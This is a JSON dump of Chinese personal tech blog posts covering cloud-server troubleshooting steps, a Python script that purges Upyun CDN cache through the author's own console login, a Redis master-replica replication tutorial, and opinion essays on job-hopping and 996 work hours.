还有一类人是他有一定的技术能力解决问题，但是他对于云厂商依赖特别大，大大小小的问题完全不经过大脑思考，不会想着自己先排查一遍，实在解决不了了才反馈云厂商。遇到问题总是想着自上而下的思路去解决而不是自下而上的，一旦发现问题立马会把问题归结于是不是云厂商出现了问题，而不是自己本地系统或网络出现了问题，比如，一台Windows server 无法连接，这种问题最优的解决方案应该是： 第一，确认本地是否能够ping 通 这台服务器的 IP 地址，如果可以ping 通并且ping 值正常说明服务器之间网络是没有问题的； 如果无法ping 通，确认是否服务端禁止了icmp 协议。 第二， Telnet 这台服务器的远程端口，例如 3389 ，如果打不开，可能原因： 服务器端口没打开，可能是防火墙之类的阻挡了请求 如果之前可以连接，可以回想下是不是之前做了什么操作导致的，可以通过 VNC(云厂商都提供这种方式) 进入系统确认防火墙和远程配置是否打开。 第三，如果上面都确认无误，可以就行尝试例如通过其他机器Telnet 确认下是否可以，以判断是否是本地操作系统设置原因导致的。例如厂商 ping 其他网站看看是否有问题以及本地是否对远程访问做了一些禁止策略，或尝试连接其他服务器是否仍然存在相同问题。 第四，确认下本地到服务器的路由是否有问题，可以通过 traceroute、mtr 等工具辅助判断 第五，拿着报错信息百度(都不要求你谷歌了)。 第六，去看下云厂商的监控信息，看下是不是CPU、内存或磁盘IO、磁盘利用率等出现异常导致的服务器死机。 这五步快速操作下，最多不超过2分钟就可以排除是本地问题还是服务器自身问题亦或是云厂商问题。 其实这都是最基本的运维能力吧！ 这些都不会真的不能算是运维，只能算是打杂的。 以上如果还未解决，可以把你的排查思路和结果(截图) 反馈给云厂商协助处理，一般这样的用户我还是不会抗拒的，至少他有自己先解决。但是大多数情况下，我遇到的客户都是遇到问题就想着把责任归结于云厂商。 云计算行业虽然发展迅速，但是从业人员的技术水平越来越差，很多用户的运维水平甚至连RHCSA(红帽最低级的水平) 都没有达到。这些低端人才迟早有一条会被时代丢到垃圾堆去的，只不过是时间问题。 其实，我身边的很多开发人员，他们虽然不算专业的运维，但是运维水平都非常强，除了代码写的好以外，甚至自己的业务都自己运维，包括服务的自动化发布、系统调优、故障拍错等等。所以这种低端运维还有什么出路？只不过是个打杂的而已。 十年前，那会还云计算还不火，低端运维可能在IDC会用个光盘安装个操作系统就有口饭吃，十年后，操作系统根本就不需要你去机房安装，直接线上鼠标点点就可以，技术不断发展，人也要不断进步才能不被时代淘汰。","categories":[],"tags":[{"name":"云计算","slug":"云计算","permalink":"https://awen.me/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"}]},{"title":"免登陆刷新CDN 缓存","slug":"免登陆刷新CDN-缓存","date":"2019-04-26T12:12:34.000Z","updated":"2021-02-26T06:05:29.312Z","comments":true,"path":"posts/52417.html","link":"","permalink":"https://awen.me/posts/52417.html","excerpt":"","text":"一直使用又拍的 CDN，非常好用，但是 CDN 这个东西我总结就一句话，好也是缓存，败也是缓存，众所周知，缓存是 CDN 的核心，通过缓存可以加速文件的访问，但是同时也带来一些问题，比如一个文件你已经更新了，但是 CDN 缓存还没有过期，这个时候就需要把 CDN 的缓存删除掉，强制 CDN 回源站获取最新文件。 但是，我不想每次都打开又拍的官网去点击刷新，然后在文本框输入 URL 去刷新，操作步骤太多了，于是，我写了个脚本，只需要在终端执行 pure_cdn $url 即可刷新，如下 1234567891011purge_cdn https://www.awen.me/post/52417.html&#123; \"result\":[ &#123; \"code\":1, \"status\":\"\\u5237\\u65b0\\u6210\\u529f\", \"task_id\":\"11100087ce3b6326c3ab121556281789\", \"url\":\"https://www.awen.me/post/52417.html\" &#125; ]&#125; 具体实现也很简单，就是通过模拟登录又拍云的控制台，然后调用他们的缓存刷新接口实现刷新。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#-*-coding:utf-8-*-import requestsimport jsonimport sys def login(username,password): url = \"https://console.upyun.com/accounts/signin/\" payload = &#123;\"username\":username,\"password\":password&#125; headers = &#123; 'Accept': \"application/json, text/plain, */*\", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\", 'Cache-Control': \"no-cache\", 'Connection': \"keep-alive\", 'Content-Length': \"56\", 'Content-Type': \"application/json\", 'DNT': \"1\", 'Host': \"console.upyun.com\", 'Origin': \"https://console.upyun.com\", 'Pragma': \"no-cache\", 'Referer': \"https://console.upyun.com/login/\", 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36\", 'cache-control': \"no-cache\", 'Postman-Token': \"2d9bd080-b549-4c41-89ce-0b011f344a3f\" &#125; response = requests.request(\"POST\", url, data=json.dumps(payload), headers=headers) if response.status_code == 200: return response.cookiesdef purge_cdn(cookie,purge_url): url = \"https://console.upyun.com/api/purge/\" payload = &#123;\"urls\":purge_url&#125; headers = &#123; 'Accept': \"application/json, text/plain, */*\", 'Accept-Encoding': \"gzip, deflate, br\", 'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\", 'Cache-Control': \"no-cache\", 'Connection': \"keep-alive\", 'Content-Length': \"28\", 'Content-Type': \"application/json\", 'DNT': \"1\", 'Host': \"console.upyun.com\", 'Origin': \"https://console.upyun.com\", 'Pragma': \"no-cache\", 'Referer': \"https://console.upyun.com/purge/purge_url/\", 'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36\", 'cache-control': \"no-cache\", &#125; response = requests_session.post(url, data=json.dumps(payload), headers=headers,cookies=cookie) json_format = json.dumps(response.json()[\"data\"], sort_keys=True, indent=4, separators=(',', ':')) print(json_format)if __name__ == '__main__': username = \"\" #用户名 password = \"\" # 密码 cookie = login(username,password) requests_session = requests.Session() purge_url = sys.argv[1] purge_cdn(cookie,purge_url)","categories":[],"tags":[]},{"title":"redis 主从复制","slug":"redis-主从复制","date":"2019-04-26T02:49:27.000Z","updated":"2021-02-26T06:05:29.289Z","comments":true,"path":"posts/20754.html","link":"","permalink":"https://awen.me/posts/20754.html","excerpt":"","text":"在分布式系统中为了解决单点问题，通常会把数据复制多个副本部署到其他机器，满足故障恢复和负载均衡等需求。 配置建立主从关系准备2个redis.conf 配置文件，并修改redis 1 的端口为 6379 redis2 的端口为6380。 12345678910111213[root@redis-cluster-50 opt]# tree.├── redis1│ ├── appendonly.aof│ ├── dump.rdb│ └── redis.conf└── redis2 ├── appendonly.aof ├── dump.rdb └── redis.conf2 directories, 6 files[root@redis-cluster-50 opt]# 配置守护进程 1daemonize yes 执行 12.&#x2F;redis-server &#x2F;opt&#x2F;redis1&#x2F;redis.conf.&#x2F;redis-server &#x2F;opt&#x2F;redis2&#x2F;redis.conf 打开2个终端，执行 12redis-cli -h 127.0.0.1 -p 6379redis-cli -h 127.0.0.1 -p 6380 redis 的复制都是在从节点上进行的，在6380 这个redis 上执行 12127.0.0.1:6380&gt; SLAVEOF 127.0.0.1 6379OK 在2个终端分别执行 info replication 查看主从复制信息 1234567891011121314151617181920212223242526272829303132333435127.0.0.1:6379&gt; info replication # 主节点的replication信息# Replicationrole:masterconnected_slaves:1slave0:ip&#x3D;127.0.0.1,port&#x3D;6380,state&#x3D;online,offset&#x3D;106922,lag&#x3D;0master_replid:46e7db3cffa10b8de08c7fdb04682a8b3cb8fb39master_replid2:0000000000000000000000000000000000000000master_repl_offset:106922second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:1repl_backlog_histlen:106922127.0.0.1:6380&gt; info replication # 从节点的replication信息# Replicationrole:slavemaster_host:127.0.0.1master_port:6379master_link_status:upmaster_last_io_seconds_ago:2master_sync_in_progress:0slave_repl_offset:106654slave_priority:100slave_read_only:1connected_slaves:0master_replid:46e7db3cffa10b8de08c7fdb04682a8b3cb8fb39master_replid2:0000000000000000000000000000000000000000master_repl_offset:106654second_repl_offset:-1repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:106585repl_backlog_histlen:70127.0.0.1:6380&gt; 验证主从是否正常工作 12345678127.0.0.1:6379&gt; set hello china # 在主节点 添加一个键值对。OK127.0.0.1:6379&gt; get hello&quot;china&quot;127.0.0.1:6379&gt;127.0.0.1:6380&gt; get hello # 在从节点获取，可以看到已经可以正常获取了。&quot;china&quot; 断开主从关系要断开主从关系，可以在从节点执行 12345678910111213141516127.0.0.1:6380&gt; SLAVEOF on one # 断开主从(error) ERR value is not an integer or out of range127.0.0.1:6380&gt; SLAVEOF no oneOK127.0.0.1:6380&gt; info replication # 从节点升级为master# Replicationrole:masterconnected_slaves:0master_replid:3201cbe916590fa6a33ebe7b4c9bdb616dda4a49master_replid2:46e7db3cffa10b8de08c7fdb04682a8b3cb8fb39master_repl_offset:107118second_repl_offset:107119repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:106585repl_backlog_histlen:534 从节点断开复制不会抛弃已有数据，只是无法再从主节点获取新数据。 切主操作通过slaveof命令还可以实现切主操作，所谓切主是指把当前从节点对主节点的复制切换到另一个主节点。执行slaveof{newMasterIp}{newMasterPort}命令即可，例如把6380节点从原来的复制6379节点变为复制6381节点。 切主后从节点会清空之前的所有数据。 只读默认情况下，从节点使用slave-read-only=yes配置为只读模式。由于复制只能从主节点到从节点，对于从节点的任何修改主节点都无法感知，修改从节点会造成主从数据不一致。因此建议线上不要修改从节点的只读模式。 传输延迟主从节点一般部署在不同机器上，复制时的网络延迟就成为需要考虑的问题，Redis为我们提供了repl-disable-tcp-nodelay参数用于控制是否关闭TCP_NODELAY，默认关闭，说明如下： 当关闭时，主节点产生的命令数据无论大小都会及时地发送给从节点，这样主从之间延迟会变小，但增加了网络带宽的消耗。适用于主从之间的网络环境良好的场景，如同机架或同机房部署。 当开启时，主节点会合并较小的TCP数据包从而节省带宽。默认发送时间间隔取决于Linux的内核，一般默认为40毫秒。这种配置节省了带宽但增大主从之间的延迟。适用于主从网络环境复杂或带宽紧张的场景，如跨机房部署。 部署主从节点时需要考虑网络延迟、带宽使用率、防灾级别等因素，如要求低延迟时，建议同机架或同机房部署并关闭repl-disable-tcp-nodelay；如果考虑高容灾性，可以同城跨机房部署并开启repl-disable-tcp-nodelay。 redis 的主从结构redis 的主从 有一主对一从 一主对多从以及树状结构三种。 redis 的注册复制过程1.保存主节点信息 2.主从建立socket连接 3.发送ping命令 4.权限验证 5.同步数据集 6.命令持续复制 redis 的数据同步 全量复制：一般用于初次复制场景，缺点 开销大 部分复制：用于处理在主从复制中因网络闪断等原因造成的数据丢失场景，当从节点再次连上主节点后，如果条件允许，主节点会补发丢失数据给从节点。因为补发的数据远远小于全量数据，可以有效避免全量复制的过高开销。 复制偏移量参与复制的主从节点都会维护自身复制偏移量。主节点（master）在处369理完写入命令后，会把命令的字节长度做累加记录，统计信息在inforelication中的master_repl_offset指标 123456789101112127.0.0.1:6379&gt; INFO replication# Replicationrole:masterconnected_slaves:0master_replid:45c39d0284b377c5d476a57da87a5bd50be2c694master_replid2:0000000000000000000000000000000000000000master_repl_offset:107118second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:1repl_backlog_histlen:107118 从节点（slave）每秒钟上报自身的复制偏移量给主节点，因此主节点也会保存从节点的复制偏移量，统计指标如 123127.0.0.1:6379&gt; info replicationconnected_slaves:1slave0:ip&#x3D;127.0.0.1,port&#x3D;6380,state&#x3D;online,offset&#x3D;107118,lag&#x3D;1. 从节点在接收到主节点发送的命令后，也会累加记录自身的偏移量。统计信息在info relication中slavereploffset指标 123456789101112127.0.0.1:6380&gt; info replication# Replicationrole:masterconnected_slaves:0master_replid:f7fa776136b46d706326d5028e217e2c0393ed8cmaster_replid2:0000000000000000000000000000000000000000master_repl_offset:107118second_repl_offset:-1repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:106585repl_backlog_histlen:534 通过对比主从节点的复制偏移量，可以判断主从节点数据是否一致。 复制挤压缓冲区复制积压缓冲区是保存在主节点上的一个固定长度的队列，默认大小为1MB，当主节点有连接的从节点（slave）时被创建，这时主节点（master）响应写命令时，不但会把命令发送给从节点，还会写入复制积压缓冲区 由于缓冲区本质上是先进先出的定长队列，所以能实现保存最近已复制数据的功能，用于部分复制和复制命令丢失的数据补救。 1234repl_backlog_active:0 &#x2F;&#x2F; 开启复制缓冲区repl_backlog_size:1048576 &#x2F;&#x2F; 缓冲区最大长度repl_backlog_first_byte_offset:1 &#x2F;&#x2F;起始偏移量，计算当前缓冲区可用范围repl_backlog_histlen:107118 &#x2F;&#x2F;已保存的有效长度 主节点运行ID每个Redis节点启动后都会动态分配一个40位的十六进制字符串作为运行ID。运行ID的主要作用是用来唯一识别Redis节点，比如从节点保存主节点的运行ID识别自己正在复制的是哪个主节点。 12345678910111213141516171819202122127.0.0.1:6379&gt; INFO server# Serverredis_version:5.0.4redis_git_sha1:00000000redis_git_dirty:0redis_build_id:803d687d1157c559redis_mode:standaloneos:Linux 3.10.0-957.10.1.el7.x86_64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:4.8.5process_id:13049run_id:3caec0db309f595a030f05c04b60f800f99aadfe # 运行IDtcp_port:6379uptime_in_seconds:89010uptime_in_days:1hz:10configured_hz:10lru_clock:12756369executable:&#x2F;root&#x2F;redis-5.0.4&#x2F;src&#x2F;.&#x2F;redis-serverconfig_file:&#x2F;opt&#x2F;redis1&#x2F;redis.conf redis 关闭后再次重启，运行ID 会变化,当运行ID变化后从节点将做全量复制。 如何在不改变运行ID的情况下重启呢？ 当需要调优一些内存相关配置，例如：hash-max-ziplist-value等，这些配置需要Redis重新加载才能优化已存在的数据，这时可以使用debug reload命令重新加载RDB并保持运行ID不变，从而有效避免不必要的全量复制。命令如: 123456# redis-cli -p 6379 info server | grep run_idrun_id:3caec0db309f595a030f05c04b60f800f99aadfe# redis-cli debug reloadOK# redis-cli -p 6379 info server | grep run_idrun_id:3caec0db309f595a030f05c04b60f800f99aadfe debug reload命令会阻塞当前Redis节点主线程，阻塞期间会生成本地RDB快照并清空数据之后再加载RDB文件。因此对于大数据量的主节点和无法容忍阻塞的应用场景，谨慎使用。 psync从节点使用psync命令完成部分复制和全量复制功能 1psync [runid] [offset] runid: 从节点所复制主节点的运行id offset： 当前从节点已复制的数据偏移量 流程说明 从节点发送psync 给主节点 主节点根据psync 参数和自身数情况节点响应结果 如果回复+ FULLRESYNC [runid] [offset]，那么从节点将触发全量复制 如果回复+CONTINUE,从节点将触发部分复制流程。 如果回复+ ERR，说明主节点版本低于2.8，无法识别pysnc，从节点将发送旧版的sync命令触发全量复制流程。 全量复制流程说明 发送psync进行数据同步，由于是第一次，从节点没有复制偏移量和主节点的运行ID，因此发送psync-1 主节点根据psync-1解析出当前为全量复制，回复+FULLRESYNC 从节点收到主节点的响应数据保存runid和offset。 主节点执行bgsave 保存RDB 到本地。 Redis3.0之后在输出的日志开头会有M、S、C等标识，对应的含义是：M=当前为主节点日志，S=当前为从节点日志，C=子进程日志，我们可以根据日志标识快速识别出每行日志的角色信 主节点发送RDB文件给从节点，从节点接收RDB保存本地直接作为从节点的数据文件。此时如果主节点有写入会存储在缓冲区中。 从节点接收完主节点传送来的全部数据后会清空自身旧数据 从节点清空数据后会加载 RDB 文件。如果文件较大，这一步骤会很长。 对于线上做读写分离的场景，从节点也负责响应读命令。如果此时从节点正出于全量复制阶段或者复制中断，那么从节点在响应读命令可能拿到过期或错误的数据。对于这种场景，Redis复制提供了slave-serve-stale-data参数，默认开启状态。如果开启则从节点依然响应所有命令。对于无法容忍不一致的应用场景可以设置no来关闭命令执行，此时从节点除了info和slaveof命令之外所有的命令只返回“SYNC with master in progress”信息 从节点成功加载 RDB 后，如果当前节点开启了AOF会立刻做bgrewriteaof 操作。 部分复制部分复制主要是Redis针对全量复制的过高开销做出的一种优化措施，使用psync{runId}{offset}命令实现。当从节点（slave）正在复制主节点(master）时，如果出现网络闪断或者命令丢失等异常情况时，从节点会向主节点要求补发丢失的命令数据，如果主节点的复制积压缓冲区内存在这部分数据则直接发送给从节点，这样就可以保持主从节点复制的一致性。补发的这部分数据一般远远小于全量数据，所以开销很小。 当主从节点之间网络出现中断时，如果超过repl-timeout时间，主节点会认为从节点故障并中断复制连接。 主从连接中断期间主节点依然响应命令，但因复制连接中断命令无法发送给从节点，不过主节点内部存在的复制积压缓冲区，依然可以保存最近一段时间的写命令数据，默认最大缓存1MB。 当主从节点网络恢复后，从节点会再次连上主节点。 当主从连接恢复后，由于从节点之前保存了自身已复制的偏移量和主节点的运行ID。因此会把它们当作psync参数发送给主节点，要求进行部分复制操作。 主节点接到psync命令后首先核对参数runId是否与自身一致，如果一致，说明之前复制的是当前主节点；之后根据参数offset在自身复制积压缓冲区查找，如果偏移量之后的数据存在缓冲区中，则对从节点发送+CONTINUE响应，表示可以进行部分复制。 主节点根据偏移量把复制积压缓冲区里的数据发送给从节点，保证主从复制进入正常状态。 心跳主从心跳判断机制： 1）主从节点彼此都有心跳检测机制，各自模拟成对方的客户端进行通信，通过client list命令查看复制相关客户端信息，主节点的连接状态为flags=M，从节点连接状态为flags=S。 2）主节点默认每隔10秒对从节点发送ping命令，判断从节点的存活性和连接状态。可通过参数repl-ping-slave-period控制发送频率。 3）从节点在主线程中每隔1秒发送replconf ack{offset}命令，给主节点上报自身当前的复制偏移量。replconf命令主要作用如下： 实时监测主从节点网络状态。- 上报自身复制偏移量，检查复制数据是否丢失，如果从节点数据丢失，再从主节点的复制缓冲区中拉取丢失数据。 实现保证从节点的数量和延迟性功能，通过min-slaves-to-write、min\u0002slaves-max-lag参数配置定 主节点根据replconf命令判断从节点超时时间，体现在info replication统计中的lag信息中，lag表示与从节点最后一次通信延迟的秒数，正常延迟应该在0和1之间。如果超过repl-timeout配置的值（默认60秒），则判定从节点下线并断开复制客户端连接。即使主节点判定从节点下线后，如果从节点重新恢复，心跳检测会继续进行。 异步复制主节点不但负责数据读写，还负责把写命令同步给从节点。写命令的发送过程是异步完成，也就是说主节点自身处理完写命令后直接返回给客户端，并不等待从节点复制完成。 注意事项读写分离可能会遇到的问题 复制数据延迟 读到过期数据 从节点故障 读取到过期数据 惰性删除：主节点每次处理读取命令时，都会检查键是否超时，如果超时则执行del命令删除键对象，之后del命令也会异步发送给从节点。需要注意的是为了保证复制的一致性，从节点自身永远不会主动删除超时数据。 定时删除：Redis主节点在内部定时任务会循环采样一定数量的键，当发现采样的键过期时执行del命令，之后再同步给从节点。 从节点故障 对于从节点的故障问题，需要在客户端维护可用从节点列表，当从节点故障时立刻切换到其他从节点或主节点上。 主从配置不一致主从配置不一致是一个容易忽视的问题。对于有些配置主从之间是可以不一致，比如：主节点关闭AOF在从节点开启。但对于内存相关的配置必须要一致，比如maxmemory，hash-max-ziplist-entries等参数。当配置的maxmemory从节点小于主节点，如果复制的数据量超过从节点maxmemory时，它会根据maxmemory-policy策略进行内存溢出控制，此时从节点数据已经丢失，但主从复制流程依然正常进行，复制偏移量也正常。修复这类问题也只能手动进行全量复制。当压缩列表相关参数不一致时，虽然主从节点存储的数据一致但实际内存占用情况差异会比较大。 规避全量复制全量复制是一个非常消耗资源的操作，要尽量避免： 第一次建立复制，会触发全量复制。 节点runid不一致: 当节点id不一致会触发全量复制，要进行规避。 复制积压缓冲区不足：对于大流量场景显然不够，这时需要增大积压缓冲区，防止因为请求的偏移量不在主节点的积压缓冲区内，则无法提供给从节点数据，因此部分复制会退化为全量复制。 规避复制风暴复制风暴是指大量从节点对同一主节点或者对同一台机器的多个主节点短时间内发起全量复制的过程。复制风暴对发起复制的主节点或者机器造成大量开销，导致CPU、内存、带宽消耗。 单主节点复制风暴 单主节点复制风暴一般发生在主节点挂载多个从节点的场景。当主节点重启恢复后，从节点会发起全量复制流程，这时主节点就会为从节点创建RDB快照，如果在快照创建完毕之前，有多个从节点都尝试与主节点进行全量同步，那么其他从节点将共享这份RDB快照。这点Redis做了优化，有效避免了创建多个快照。但是，同时向多个从节点发送RDB快照，可能使主节点的网络带宽消耗严重，造成主节点的延迟变大，极端情况会发生主从节点连接断开，导致复制失败。 解决方案首先可以减少主节点（master）挂载从节点（slave）的数量，或者采用树状复制结构，加入中间层从节点用来保护主节点。 从节点采用树状树非常有用，网络开销交给位于中间层的从节点，而不必消耗顶层的主节点。但是这种树状结构也带来了运维的复杂性，增加了手动和自动处理故障转移的难度。 单机器复制风暴 出现在一台机器部署多个redis 实例，如果这台机器出现故障或网络长时间中断，当它重启恢复后，会有大量从节点（slave）针对这台机器的主节点进行全量复制，会造成当前机器网络带宽耗。 如何避免？方法如下： 应该把主节点尽量分散在多台机器上，避免在单台机器上部署过多的主节点。 当主节点所在机器故障后提供故障转移机制，避免机器恢复后进行密集的全量复","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"恶意频繁跳槽将影响个人信用","slug":"恶意频繁跳槽将影响个人信用","date":"2019-04-25T12:20:31.000Z","updated":"2021-02-26T06:05:29.334Z","comments":true,"path":"posts/27549.html","link":"","permalink":"https://awen.me/posts/27549.html","excerpt":"近日，在宁波举行的一场座谈会上一名人力资源总经理表示，企业可以提前一个月(通知)员工离职，但是要赔经济补偿金；如果不这么做，还要赔双倍，(属于)违法解除。但是员工要走，说真的我们现在一点办法都没有。浙江省人力资源和社会保障厅副厅长葛平安回应员工要走，接下来也有制约措施。浙江省马上要推进人社的信息体系建设，对单位和个人都要建立信用体系。个人老是频繁地辞职和就业的话，那肯定他的信用成问题了。 在座谈会上还有单位表示他们都是全国引进人才，信用这块不仅仅是要区域性的，更要全国推广。还需要和信贷信用和职业信用以及就职信用挂钩。 此事一出网络上一片哗然，随后浙江省人社厅表示，这句话的原意并不是说跳槽就会影响个人信用分，而是恶意频繁跳槽等行为或受影响。","text":"近日，在宁波举行的一场座谈会上一名人力资源总经理表示，企业可以提前一个月(通知)员工离职，但是要赔经济补偿金；如果不这么做，还要赔双倍，(属于)违法解除。但是员工要走，说真的我们现在一点办法都没有。浙江省人力资源和社会保障厅副厅长葛平安回应员工要走，接下来也有制约措施。浙江省马上要推进人社的信息体系建设，对单位和个人都要建立信用体系。个人老是频繁地辞职和就业的话，那肯定他的信用成问题了。 在座谈会上还有单位表示他们都是全国引进人才，信用这块不仅仅是要区域性的，更要全国推广。还需要和信贷信用和职业信用以及就职信用挂钩。 此事一出网络上一片哗然，随后浙江省人社厅表示，这句话的原意并不是说跳槽就会影响个人信用分，而是恶意频繁跳槽等行为或受影响。 但是这里对于什么是「恶意」什么是「频繁」并未给出更具体的定义。 为什么员工会频繁跳槽其实对于大多数求职者来说，本意都是希望找一份稳定的工作，然后在工作中提升和成长，没有多少人是愿意和三和大神那样玩得转”日结阔以活三天”这样的生活。 马云曾经说过：”员工离职的原因无非2条，一是钱没给够，二是心委屈了”。 据调查显示，跳槽最频繁的都是年轻人，他们的年龄普遍在23-30岁之间。这个年龄段的人社会责任小，随着生活条件的不断发展，90 后甚至 00 后都开始步入社会，他们的家庭条件相对 70 后 80 后要好很多，所以找工作时他们的关注点不仅仅只是看薪水、更多的是看工作环境、公司氛围以及直属领导是否容易相处。加上有很多年轻大学生刚从象牙塔出来，社会阅历不足以及对自己的未来没有合理规划，导致漫无目的的频繁换行业和换工作。而相对来说，那些有家庭有社会责任的中年人频繁跳槽的概率就要小很多。 同时也有很多求职者跳槽的原因是因为企业自身的不规范，缺乏吸引力，以及压力过大导致（例如长时间加班），尤其是一些中小型初创公司，例如不缴纳社保公积金或按最低标准缴纳、不签订劳动合同、工资莫名其妙的在不告知的情况下打8折、各种方式变相克扣或拖欠工资、长期加班，完全没有自己的业余时间可以支配，发现自己薪水不符合市场同等水平、各种奇葩的企业文化等等。 频繁跳槽有哪些劣势首先，从求职者角度来看，一定要有意识，频繁跳槽是不好的现象，要对自己的未来 1 到 3 年有一个大概的职业规划，确定自己未来希望从事的行业，切记频繁的在不同的行业跳来跳去。会让用人单位觉得你这个人没有职业规划，不稳定，不敢要你。其次，频繁跳槽不利于自身的能力积累。一般来说当你进入一个行业至少需要一年的技术积累和沉淀才算是真正入行。如果频繁跳槽就会让人觉得你没有什么沉淀，会丧失竞争力。 求职者应当要提高自己的核心竞争力，例如行业的专业技术水平、学习能力、沟通能力、跨部门协作能力、组织协调能力等等，才是在职场上立于不败之地的不二法门。 现在有很多企业都在筛选简历的时候直接过滤不满足工作年限的求职者，比如京东，在招聘时要求上一家单位工作年限必须满2年以上。 之前我在给公司做招聘时，HR 就和我说过，如果一个人频繁换行业跳槽的绝对不考虑。 适当跳槽有利于求职者也有利于企业不得不承认，频繁跳槽固然不可取，但是适当跳槽对于用人单位和求职者而言都是有好处的。 首先，适当跳槽对于求职者而言最直接的优势就是待遇的提升了（相信很少有人会降薪跳槽吧！）。因此，建议求职者每年都看一看机会，一来可以确定下自己在市场上的竞争力如何，如果不够是哪里不够，可以更好的提升自己。另外也可以确定下自己的薪资待遇是否符合市场预期。 其次，一家单位的离职率控制在适当比率有利于企业注入新鲜血液，提高企业的活力和竞争力。 如何解决频繁跳槽这个问题求职者在找工作的时候要尽量选择一些正规的企业，避开上面提到有那些问题的用人单位，这样就可以避免后期不必要的跳槽。比如在求职前就先了解这家单位在行业内的水平和岗位的薪资待遇水平大概是什么范围，也可以面试时就可以直接问有没有长期加班、社保公积金是怎么缴纳的、薪资的组成部分，一般正规公司是不会忌讳求职者问这些问题的，事实上，工作的很大动力还是看薪水，这些东西一定要先了解清楚。 其次，从企业方面来看，用人单位要建立和健全自身的人才吸引力，从福利待遇、工作环境等方面入手加强对人才的吸引力。打造符合年轻人的人性化的企业文化。吸引优秀的人才加盟。 是否需要将频繁跳槽纳入征信体系不得不承认，在当下，用人单位和求职者双方关系中劳动者一直是出于弱势群体，话语权和议价权极小。如果只将求职者的跳槽纳入征信体系势必会导致有些不正规的用人单位更加肆无忌惮的对待员工，因为企业方面吃定了你不敢轻易跳槽。 其次，每个人都有选择职业的自由和权利，一个人不论出于什么目的跳槽，本质都是为了获得相应的提升。不论是个人能力还是薪酬待遇上。如果一家单位离职率特别高，是不是应该首先考虑下自身的福利待遇以及环境是否在市场上有吸引力呢？ 如果真的要将频繁跳槽纳入征信，那是否同时也应当将用人单位也加入征信体系并向社会公开这样才显示出公平。职场是双向选择的事情，目前来看求职者的各项信息企业是知道的一清二楚，但是有的企业的相关信息，例如盈利能力、工作环境、直属领导人品、福利待遇等都是非透明的。这就产生了信息不对称，求职者就有可能选择错误，从而导致后期跳槽。 写在最后不论是否会将频繁跳槽纳入征信，笔者都希望每一位求职者都要提升自己的核心竞争力。这样你在跟企业谈判的时候才会有底气，有自信，有资格平等谈判。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"从工厂996 到互联网996","slug":"从工厂996-到互联网996","date":"2019-04-25T12:19:28.000Z","updated":"2021-02-26T06:05:29.300Z","comments":true,"path":"posts/55234.html","link":"","permalink":"https://awen.me/posts/55234.html","excerpt":"从工厂996 到互联网996身为互联网行业的从业者被 996 困扰着，那其他行业呢？其实其他行业 996 比互联网行业还严重。我目前职业是一名互联网工程师，但是也曾有过一段工厂经历。今天就来和大家聊一聊我这些年从工厂工人到互联网的经历以及一些感悟吧！","text":"从工厂996 到互联网996身为互联网行业的从业者被 996 困扰着，那其他行业呢？其实其他行业 996 比互联网行业还严重。我目前职业是一名互联网工程师，但是也曾有过一段工厂经历。今天就来和大家聊一聊我这些年从工厂工人到互联网的经历以及一些感悟吧！ 工厂 996 生活在上大学时，有一年暑假我没有回家而是选择去工厂体验一下生活，于是我隐藏我学生身份混进了美的工厂去做一名普通流水线工人。当时工厂给开的薪水是 900 块钱一个月，钱真的不多，当然我也不是冲着赚钱去工厂，工厂提供食宿，住宿是6个人一间房，一个月电费水费要自己交 50块钱，吃饭工厂有食堂。 工作经过2天简单培训就正式上岗了，工作内容就是给冰箱安装门，流水线流程非常标准和规范，每一个步骤都有一到两个个人负责，早上7点30到车间报道，然后一直干到晚上7点30下班，12小时，中间30分钟吃饭时间，这是标准工作时长，但是从来没有准点下班过，基本都得加班到九十点甚至更晚，并且没有加班费一说也没有双休一说，工厂根据不同流水线的生产情况安排一个月可以休息1-2天，而且干的都是纯体力劳动，得一直站着，当流水线过来一个冰箱，就得用汽枪(通过气体产生动力安装螺丝的一种工具) 给冰箱打2颗螺丝，一天得安装 300多个冰箱门，当然这只是我负责的工作，一天真的很忙，上厕所的时间都没有，因为你一离开，冰箱门就没有人安装了，因为你导致当天的工作量没有完成是要被骂并且加班的，很多时候食堂虽然有饭，但是你没有时间去吃，因此下班后会给你免费发一包方便面和一根火腿肠以及一瓶水，我那一个月吃泡面都吃吐了。工厂里还会发生一些意外事故，比如工厂干活被机器绞断了指指都是很常见的事情，干了一个月，我就找理由离开了，因为我实在受不了这里面非人一样的工作环境，另外是马上要开学了，我得回去上课，我从工厂递交辞职信后走出工厂的那一步，回头看了一眼这座”血汗工厂”，我心里暗暗发誓，打死这辈子不要混到这种鬼地方来。 